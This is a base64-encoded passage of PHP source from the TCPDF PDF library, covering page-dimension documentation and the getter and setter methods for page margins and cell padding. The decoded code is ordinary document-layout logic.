cy0+cGFnZV1bJ3cnXSA9IHBhZ2Ugd2lkdGggaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydoJ10gPSBoZWlnaHQgaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd3ayddID0gcGFnZSB3aWR0aCBpbiB1c2VyIHVuaXRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydoayddID0gcGFnZSBoZWlnaHQgaW4gdXNlciB1bml0czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndG0nXSA9IHRvcCBtYXJnaW48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ2JtJ10gPSBib3R0b20gbWFyZ2luPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydsbSddID0gbGVmdCBtYXJnaW48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3JtJ10gPSByaWdodCBtYXJnaW48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3BiJ10gPSBhdXRvIHBhZ2UgYnJlYWs8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29yJ10gPSBwYWdlIG9yaWVudGF0aW9uPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXSA9IG9yaWdpbmFsIGxlZnQgbWFyZ2luPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXSA9IG9yaWdpbmFsIHJpZ2h0IG1hcmdpbjwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnUm90YXRlJ10gPSBUaGUgbnVtYmVyIG9mIGRlZ3JlZXMgYnkgd2hpY2ggdGhlIHBhZ2Ugc2hhbGwgYmUgcm90YXRlZCBjbG9ja3dpc2Ugd2hlbiBkaXNwbGF5ZWQgb3IgcHJpbnRlZC4gVGhlIHZhbHVlIHNoYWxsIGJlIGEgbXVsdGlwbGUgb2YgOTAuPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydQWiddID0gVGhlIHBhZ2UncyBwcmVmZXJyZWQgem9vbSAobWFnbmlmaWNhdGlvbikgZmFjdG9yLjwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXSA6IHRoZSBzdHlsZSBhbmQgZHVyYXRpb24gb2YgdGhlIHZpc3VhbCB0cmFuc2l0aW9uIHRvIHVzZSB3aGVuIG1vdmluZyBmcm9tIGFub3RoZXIgcGFnZSB0byB0aGUgZ2l2ZW4gcGFnZSBkdXJpbmcgYSBwcmVzZW50YXRpb248dWw+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRHVyJ10gPSBUaGUgcGFnZSdzIGRpc3BsYXkgZHVyYXRpb24gKGFsc28gY2FsbGVkIGl0cyBhZHZhbmNlIHRpbWluZyk6IHRoZSBtYXhpbXVtIGxlbmd0aCBvZiB0aW1lLCBpbiBzZWNvbmRzLCB0aGF0IHRoZSBwYWdlIHNoYWxsIGJlIGRpc3BsYXllZCBkdXJpbmcgcHJlc2VudGF0aW9ucyBiZWZvcmUgdGhlIHZpZXdlciBhcHBsaWNhdGlvbiBzaGFsbCBhdXRvbWF0aWNhbGx5IGFkdmFuY2UgdG8gdGhlIG5leHQgcGFnZS48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3RyYW5zJ11bJ1MnXSA9IHRyYW5zaXRpb24gc3R5bGUgOiBTcGxpdCwgQmxpbmRzLCBCb3gsIFdpcGUsIERpc3NvbHZlLCBHbGl0dGVyLCBSLCBGbHksIFB1c2gsIENvdmVyLCBVbmNvdmVyLCBGYWRlPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0cmFucyddWydEJ10gPSBUaGUgZHVyYXRpb24gb2YgdGhlIHRyYW5zaXRpb24gZWZmZWN0LCBpbiBzZWNvbmRzLjwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRG0nXSA9IChTcGxpdCBhbmQgQmxpbmRzIHRyYW5zaXRpb24gc3R5bGVzIG9ubHkpIFRoZSBkaW1lbnNpb24gaW4gd2hpY2ggdGhlIHNwZWNpZmllZCB0cmFuc2l0aW9uIGVmZmVjdCBzaGFsbCBvY2N1cjogSCA9IEhvcml6b250YWwsIFYgPSBWZXJ0aWNhbC4gRGVmYXVsdCB2YWx1ZTogSC48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3RyYW5zJ11bJ00nXSA9IChTcGxpdCwgQm94IGFuZCBGbHkgdHJhbnNpdGlvbiBzdHlsZXMgb25seSkgVGhlIGRpcmVjdGlvbiBvZiBtb3Rpb24gZm9yIHRoZSBzcGVjaWZpZWQgdHJhbnNpdGlvbiBlZmZlY3Q6IEkgPSBJbndhcmQgZnJvbSB0aGUgZWRnZXMgb2YgdGhlIHBhZ2UsIE8gPSBPdXR3YXJkIGZyb20gdGhlIGNlbnRlciBvZiB0aGUgcGFnZURlZmF1bHQgdmFsdWU6IEkuPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0cmFucyddWydEaSddID0gKFdpcGUsIEdsaXR0ZXIsIEZseSwgQ292ZXIsIFVuY292ZXIgYW5kIFB1c2ggdHJhbnNpdGlvbiBzdHlsZXMgb25seSkgVGhlIGRpcmVjdGlvbiBpbiB3aGljaCB0aGUgc3BlY2lmaWVkIHRyYW5zaXRpb24gZWZmZWN0IHNoYWxsIG1vdmVzLCBleHByZXNzZWQgaW4gZGVncmVlcyBjb3VudGVyY2xvY2t3aXNlIHN0YXJ0aW5nIGZyb20gYSBsZWZ0LXRvLXJpZ2h0IGRpcmVjdGlvbi4gSWYgdGhlIHZhbHVlIGlzIGEgbnVtYmVyLCBpdCBzaGFsbCBiZSBvbmUgb2Y6IDAgPSBMZWZ0IHRvIHJpZ2h0LCA5MCA9IEJvdHRvbSB0byB0b3AgKFdpcGUgb25seSksIDE4MCA9IFJpZ2h0IHRvIGxlZnQgKFdpcGUgb25seSksIDI3MCA9IFRvcCB0byBib3R0b20sIDMxNSA9IFRvcC1sZWZ0IHRvIGJvdHRvbS1yaWdodCAoR2xpdHRlciBvbmx5KS4gSWYgdGhlIHZhbHVlIGlzIGEgbmFtZSwgaXQgc2hhbGwgYmUgTm9uZSwgd2hpY2ggaXMgcmVsZXZhbnQgb25seSBmb3IgdGhlIEZseSB0cmFuc2l0aW9uIHdoZW4gdGhlIHZhbHVlIG9mIFNTIGlzIG5vdCAxLjAuIERlZmF1bHQgdmFsdWU6IDAuPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0cmFucyddWydTUyddID0gKEZseSB0cmFuc2l0aW9uIHN0eWxlIG9ubHkpIFRoZSBzdGFydGluZyBvciBlbmRpbmcgc2NhbGUgYXQgd2hpY2ggdGhlIGNoYW5nZXMgc2hhbGwgYmUgZHJhd24uIElmIE0gc3BlY2lmaWVzIGFuIGlud2FyZCB0cmFuc2l0aW9uLCB0aGUgc2NhbGUgb2YgdGhlIGNoYW5nZXMgZHJhd24gc2hhbGwgcHJvZ3Jlc3MgZnJvbSBTUyB0byAxLjAgb3ZlciB0aGUgY291cnNlIG9mIHRoZSB0cmFuc2l0aW9uLiBJZiBNIHNwZWNpZmllcyBhbiBvdXR3YXJkIHRyYW5zaXRpb24sIHRoZSBzY2FsZSBvZiB0aGUgY2hhbmdlcyBkcmF3biBzaGFsbCBwcm9ncmVzcyBmcm9tIDEuMCB0byBTUyBvdmVyIHRoZSBjb3Vyc2Ugb2YgdGhlIHRyYW5zaXRpb24uIERlZmF1bHQ6IDEuMC4gPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0cmFucyddWydCJ10gPSAoRmx5IHRyYW5zaXRpb24gc3R5bGUgb25seSkgSWYgdHJ1ZSwgdGhlIGFyZWEgdGhhdCBzaGFsbCBiZSBmbG93biBpbiBpcyByZWN0YW5ndWxhciBhbmQgb3BhcXVlLiBEZWZhdWx0OiBmYWxzZS48L2xpPjwvdWw+PC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydNZWRpYUJveCddIDogdGhlIGJvdW5kYXJpZXMgb2YgdGhlIHBoeXNpY2FsIG1lZGl1bSBvbiB3aGljaCB0aGUgcGFnZSBzaGFsbCBiZSBkaXNwbGF5ZWQgb3IgcHJpbnRlZDx1bD48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydNZWRpYUJveCddWydsbHgnXSA9IGxvd2VyLWxlZnQgeCBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnTWVkaWFCb3gnXVsnbGx5J10gPSBsb3dlci1sZWZ0IHkgY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ01lZGlhQm94J11bJ3VyeCddID0gdXBwZXItcmlnaHQgeCBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnTWVkaWFCb3gnXVsndXJ5J10gPSB1cHBlci1yaWdodCB5IGNvb3JkaW5hdGUgaW4gcG9pbnRzPC9saT48L3VsPjwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddIDogdGhlIHZpc2libGUgcmVnaW9uIG9mIGRlZmF1bHQgdXNlciBzcGFjZTx1bD48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ2xseCddID0gbG93ZXItbGVmdCB4IGNvb3JkaW5hdGUgaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ2xseSddID0gbG93ZXItbGVmdCB5IGNvb3JkaW5hdGUgaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ3VyeCddID0gdXBwZXItcmlnaHQgeCBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWyd1cnknXSA9IHVwcGVyLXJpZ2h0IHkgY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjwvdWw+PC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydCbGVlZEJveCddIDogdGhlIHJlZ2lvbiB0byB3aGljaCB0aGUgY29udGVudHMgb2YgdGhlIHBhZ2Ugc2hhbGwgYmUgY2xpcHBlZCB3aGVuIG91dHB1dCBpbiBhIHByb2R1Y3Rpb24gZW52aXJvbm1lbnQ8dWw+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQmxlZWRCb3gnXVsnbGx4J10gPSBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0JsZWVkQm94J11bJ2xseSddID0gbG93ZXItbGVmdCB5IGNvb3JkaW5hdGUgaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydCbGVlZEJveCddWyd1cngnXSA9IHVwcGVyLXJpZ2h0IHggY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0JsZWVkQm94J11bJ3VyeSddID0gdXBwZXItcmlnaHQgeSBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PC91bD48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ1RyaW1Cb3gnXSA6IHRoZSBpbnRlbmRlZCBkaW1lbnNpb25zIG9mIHRoZSBmaW5pc2hlZCBwYWdlIGFmdGVyIHRyaW1taW5nPHVsPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ1RyaW1Cb3gnXVsnbGx4J10gPSBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ1RyaW1Cb3gnXVsnbGx5J10gPSBsb3dlci1sZWZ0IHkgY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ1RyaW1Cb3gnXVsndXJ4J10gPSB1cHBlci1yaWdodCB4IGNvb3JkaW5hdGUgaW4gcG9pbnRzPC9saT48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydUcmltQm94J11bJ3VyeSddID0gdXBwZXItcmlnaHQgeSBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PC91bD48L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0FydEJveCddIDogdGhlIGV4dGVudCBvZiB0aGUgcGFnZSdzIG1lYW5pbmdmdWwgY29udGVudDx1bD48bGk+JHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydBcnRCb3gnXVsnbGx4J10gPSBsb3dlci1sZWZ0IHggY29vcmRpbmF0ZSBpbiBwb2ludHM8L2xpPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0FydEJveCddWydsbHknXSA9IGxvd2VyLWxlZnQgeSBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQXJ0Qm94J11bJ3VyeCddID0gdXBwZXItcmlnaHQgeCBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PGxpPiR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQXJ0Qm94J11bJ3VyeSddID0gdXBwZXItcmlnaHQgeSBjb29yZGluYXRlIGluIHBvaW50czwvbGk+PC91bD48L2xpPjwvdWw+CgkgKiBAcGFyYW0gaW50fG51bGwgJHBhZ2VudW0gcGFnZSBudW1iZXIgKGVtcHR5ID0gY3VycmVudCBwYWdlKQoJICogQHJldHVybiBhcnJheSBvZiBwYWdlIGRpbWVuc2lvbnMuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNS4wMjcgKDIwMDktMDMtMTYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRQYWdlRGltZW5zaW9ucygkcGFnZW51bT1udWxsKSB7CgkJaWYgKGVtcHR5KCRwYWdlbnVtKSkgewoJCQkkcGFnZW51bSA9ICR0aGlzLT5wYWdlOwoJCX0KCQlyZXR1cm4gJHRoaXMtPnBhZ2VkaW1bJHBhZ2VudW1dOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgcGFnZSB3aWR0aCBpbiB1bml0cy4KCSAqIEBwYXJhbSBpbnR8bnVsbCAkcGFnZW51bSBwYWdlIG51bWJlciAoZW1wdHkgPSBjdXJyZW50IHBhZ2UpCgkgKiBAcmV0dXJuIGludHxmbG9hdCBwYWdlIHdpZHRoLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUuMgoJICogQHNlZSBnZXRQYWdlRGltZW5zaW9ucygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRQYWdlV2lkdGgoJHBhZ2VudW09bnVsbCkgewoJCWlmIChlbXB0eSgkcGFnZW51bSkpIHsKCQkJcmV0dXJuICR0aGlzLT53OwoJCX0KCQlyZXR1cm4gJHRoaXMtPnBhZ2VkaW1bJHBhZ2VudW1dWyd3J107Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBwYWdlIGhlaWdodCBpbiB1bml0cy4KCSAqIEBwYXJhbSBpbnR8bnVsbCAkcGFnZW51bSBwYWdlIG51bWJlciAoZW1wdHkgPSBjdXJyZW50IHBhZ2UpCgkgKiBAcmV0dXJuIGludHxmbG9hdCBwYWdlIGhlaWdodC4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41LjIKCSAqIEBzZWUgZ2V0UGFnZURpbWVuc2lvbnMoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0UGFnZUhlaWdodCgkcGFnZW51bT1udWxsKSB7CgkJaWYgKGVtcHR5KCRwYWdlbnVtKSkgewoJCQlyZXR1cm4gJHRoaXMtPmg7CgkJfQoJCXJldHVybiAkdGhpcy0+cGFnZWRpbVskcGFnZW51bV1bJ2gnXTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIHBhZ2UgYnJlYWsgbWFyZ2luLgoJICogQHBhcmFtIGludHxudWxsICRwYWdlbnVtIHBhZ2UgbnVtYmVyIChlbXB0eSA9IGN1cnJlbnQgcGFnZSkKCSAqIEByZXR1cm4gaW50fGZsb2F0IHBhZ2UgYnJlYWsgbWFyZ2luLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUuMgoJICogQHNlZSBnZXRQYWdlRGltZW5zaW9ucygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRCcmVha01hcmdpbigkcGFnZW51bT1udWxsKSB7CgkJaWYgKGVtcHR5KCRwYWdlbnVtKSkgewoJCQlyZXR1cm4gJHRoaXMtPmJNYXJnaW47CgkJfQoJCXJldHVybiAkdGhpcy0+cGFnZWRpbVskcGFnZW51bV1bJ2JtJ107Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBzY2FsZSBmYWN0b3IgKG51bWJlciBvZiBwb2ludHMgaW4gdXNlciB1bml0KS4KCSAqIEByZXR1cm4gaW50IHNjYWxlIGZhY3Rvci4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41LjIKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldFNjYWxlRmFjdG9yKCkgewoJCXJldHVybiAkdGhpcy0+azsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIGxlZnQsIHRvcCBhbmQgcmlnaHQgbWFyZ2lucy4KCSAqIEBwYXJhbSBpbnR8ZmxvYXQgJGxlZnQgTGVmdCBtYXJnaW4uCgkgKiBAcGFyYW0gaW50fGZsb2F0ICR0b3AgVG9wIG1hcmdpbi4KCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkcmlnaHQgUmlnaHQgbWFyZ2luLiBEZWZhdWx0IHZhbHVlIGlzIHRoZSBsZWZ0IG9uZS4KCSAqIEBwYXJhbSBib29sZWFuICRrZWVwbWFyZ2lucyBpZiB0cnVlIG92ZXJ3cml0ZXMgdGhlIGRlZmF1bHQgcGFnZSBtYXJnaW5zCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIFNldExlZnRNYXJnaW4oKSwgU2V0VG9wTWFyZ2luKCksIFNldFJpZ2h0TWFyZ2luKCksIFNldEF1dG9QYWdlQnJlYWsoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0TWFyZ2lucygkbGVmdCwgJHRvcCwgJHJpZ2h0PW51bGwsICRrZWVwbWFyZ2lucz1mYWxzZSkgewoJCS8vU2V0IGxlZnQsIHRvcCBhbmQgcmlnaHQgbWFyZ2lucwoJCSR0aGlzLT5sTWFyZ2luID0gJGxlZnQ7CgkJJHRoaXMtPnRNYXJnaW4gPSAkdG9wOwoJCWlmICgkcmlnaHQgPT0gLTEgT1IgJHJpZ2h0ID09PSBudWxsKSB7CgkJCSRyaWdodCA9ICRsZWZ0OwoJCX0KCQkkdGhpcy0+ck1hcmdpbiA9ICRyaWdodDsKCQlpZiAoJGtlZXBtYXJnaW5zKSB7CgkJCS8vIG92ZXJ3cml0ZSBvcmlnaW5hbCB2YWx1ZXMKCQkJJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4gPSAkdGhpcy0+bE1hcmdpbjsKCQkJJHRoaXMtPm9yaWdpbmFsX3JNYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQl9Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBsZWZ0IG1hcmdpbi4gVGhlIG1ldGhvZCBjYW4gYmUgY2FsbGVkIGJlZm9yZSBjcmVhdGluZyB0aGUgZmlyc3QgcGFnZS4gSWYgdGhlIGN1cnJlbnQgYWJzY2lzc2EgZ2V0cyBvdXQgb2YgcGFnZSwgaXQgaXMgYnJvdWdodCBiYWNrIHRvIHRoZSBtYXJnaW4uCgkgKiBAcGFyYW0gaW50fGZsb2F0ICRtYXJnaW4gVGhlIG1hcmdpbi4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjQKCSAqIEBzZWUgU2V0VG9wTWFyZ2luKCksIFNldFJpZ2h0TWFyZ2luKCksIFNldEF1dG9QYWdlQnJlYWsoKSwgU2V0TWFyZ2lucygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRMZWZ0TWFyZ2luKCRtYXJnaW4pIHsKCQkvL1NldCBsZWZ0IG1hcmdpbgoJCSR0aGlzLT5sTWFyZ2luID0gJG1hcmdpbjsKCQlpZiAoKCR0aGlzLT5wYWdlID4gMCkgQU5EICgkdGhpcy0+eCA8ICRtYXJnaW4pKSB7CgkJCSR0aGlzLT54ID0gJG1hcmdpbjsKCQl9Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSB0b3AgbWFyZ2luLiBUaGUgbWV0aG9kIGNhbiBiZSBjYWxsZWQgYmVmb3JlIGNyZWF0aW5nIHRoZSBmaXJzdCBwYWdlLgoJICogQHBhcmFtIGludHxmbG9hdCAkbWFyZ2luIFRoZSBtYXJnaW4uCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41CgkgKiBAc2VlIFNldExlZnRNYXJnaW4oKSwgU2V0UmlnaHRNYXJnaW4oKSwgU2V0QXV0b1BhZ2VCcmVhaygpLCBTZXRNYXJnaW5zKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFRvcE1hcmdpbigkbWFyZ2luKSB7CgkJLy9TZXQgdG9wIG1hcmdpbgoJCSR0aGlzLT50TWFyZ2luID0gJG1hcmdpbjsKCQlpZiAoKCR0aGlzLT5wYWdlID4gMCkgQU5EICgkdGhpcy0+eSA8ICRtYXJnaW4pKSB7CgkJCSR0aGlzLT55ID0gJG1hcmdpbjsKCQl9Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSByaWdodCBtYXJnaW4uIFRoZSBtZXRob2QgY2FuIGJlIGNhbGxlZCBiZWZvcmUgY3JlYXRpbmcgdGhlIGZpcnN0IHBhZ2UuCgkgKiBAcGFyYW0gaW50fGZsb2F0ICRtYXJnaW4gVGhlIG1hcmdpbi4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUKCSAqIEBzZWUgU2V0TGVmdE1hcmdpbigpLCBTZXRUb3BNYXJnaW4oKSwgU2V0QXV0b1BhZ2VCcmVhaygpLCBTZXRNYXJnaW5zKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFJpZ2h0TWFyZ2luKCRtYXJnaW4pIHsKCQkkdGhpcy0+ck1hcmdpbiA9ICRtYXJnaW47CgkJaWYgKCgkdGhpcy0+cGFnZSA+IDApIEFORCAoJHRoaXMtPnggPiAoJHRoaXMtPncgLSAkbWFyZ2luKSkpIHsKCQkJJHRoaXMtPnggPSAkdGhpcy0+dyAtICRtYXJnaW47CgkJfQoJfQoKCS8qKgoJICogU2V0IHRoZSBzYW1lIGludGVybmFsIENlbGwgcGFkZGluZyBmb3IgdG9wLCByaWdodCwgYm90dG9tLCBsZWZ0LQoJICogQHBhcmFtIGludHxmbG9hdCAkcGFkIGludGVybmFsIHBhZGRpbmcuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wOSkKCSAqIEBzZWUgZ2V0Q2VsbFBhZGRpbmdzKCksIHNldENlbGxQYWRkaW5ncygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRDZWxsUGFkZGluZygkcGFkKSB7CgkJaWYgKCRwYWQgPj0gMCkgewoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gPSAkcGFkOwoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10gPSAkcGFkOwoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10gPSAkcGFkOwoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gPSAkcGFkOwoJCX0KCX0KCgkvKioKCSAqIFNldCB0aGUgaW50ZXJuYWwgQ2VsbCBwYWRkaW5ncy4KCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkbGVmdCBsZWZ0IHBhZGRpbmcKCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkdG9wIHRvcCBwYWRkaW5nCgkgKiBAcGFyYW0gaW50fGZsb2F0fG51bGwgJHJpZ2h0IHJpZ2h0IHBhZGRpbmcKCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkYm90dG9tIGJvdHRvbSBwYWRkaW5nCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjAwMCAoMjAxMC0xMC0wMykKCSAqIEBzZWUgZ2V0Q2VsbFBhZGRpbmdzKCksIFNldENlbGxQYWRkaW5nKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldENlbGxQYWRkaW5ncygkbGVmdD1udWxsLCAkdG9wPW51bGwsICRyaWdodD1udWxsLCAkYm90dG9tPW51bGwpIHsKCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRsZWZ0KSBBTkQgKCRsZWZ0ID49IDApKSB7CgkJCSR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSA9ICRsZWZ0OwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0b3ApIEFORCAoJHRvcCA+PSAwKSkgewoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10gPSAkdG9wOwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRyaWdodCkgQU5EICgkcmlnaHQgPj0gMCkpIHsKCQkJJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddID0gJHJpZ2h0OwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRib3R0b20pIEFORCAoJGJvdHRvbSA+PSAwKSkgewoJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gPSAkYm90dG9tOwoJCX0KCX0KCgkvKioKCSAqIEdldCB0aGUgaW50ZXJuYWwgQ2VsbCBwYWRkaW5nIGFycmF5LgoJICogQHJldHVybiBhcnJheSBvZiBwYWRkaW5nIHZhbHVlcwoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMTAtMDMpCgkgKiBAc2VlIHNldENlbGxQYWRkaW5ncygpLCBTZXRDZWxsUGFkZGluZygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRDZWxsUGFkZGluZ3MoKSB7CgkJcmV0dXJuICR0aGlzLT5jZWxsX3BhZGRpbmc7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGludGVybmFsIENlbGwgbWFyZ2lucy4KCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkbGVmdCBsZWZ0IG1hcmdpbgoJICogQHBhcmFtIGludHxmbG9hdHxudWxsICR0b3AgdG9wIG1hcmdpbgoJICogQHBhcmFtIGludHxmbG9hdHxudWxsICRyaWdodCByaWdodCBtYXJnaW4KCSAqIEBwYXJhbSBpbnR8ZmxvYXR8bnVsbCAkYm90dG9tIGJvdHRvbSBtYXJnaW4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTEwLTAzKQoJICogQHNlZSBnZXRDZWxsTWFyZ2lucygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRDZWxsTWFyZ2lucygkbGVmdD1udWxsLCAkdG9wPW51bGwsICRyaWdodD1udWxsLCAkYm90dG9tPW51bGwpIHsKCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRsZWZ0KSBBTkQgKCRsZWZ0ID49IDApKSB7CgkJCSR0aGlzLT5jZWxsX21hcmdpblsnTCddID0gJGxlZnQ7CgkJfQoJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRvcCkgQU5EICgkdG9wID49IDApKSB7CgkJCSR0aGlzLT5jZWxsX21hcmdpblsnVCddI